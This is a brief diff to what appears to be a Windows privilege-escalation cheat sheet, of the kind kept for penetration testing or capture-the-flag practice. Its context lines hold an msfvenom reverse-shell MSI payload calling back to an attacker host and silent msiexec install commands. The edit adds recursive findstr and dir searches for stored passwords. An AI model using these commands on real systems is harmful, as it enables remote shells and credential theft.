@@ -78,7 +78,9 @@ Confirm perms - overwrite the program? (May need to upload accesschk)
     msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=53 -f msi -o reverse.msi /quiet /i reverse.msi
     #upload reverse reverse shell to C:\temp  
     msiexec /quiet /qn /i C:\Temp\reverse.msi
-## Passwords
+## Passwords  
+Run from C:\ (recursive search)  
+
     findstr /si password *.xml *.ini *.txt *.config 2>nul    
     dir /s *pass* == *vnc* == *.config* 2>nul    
     
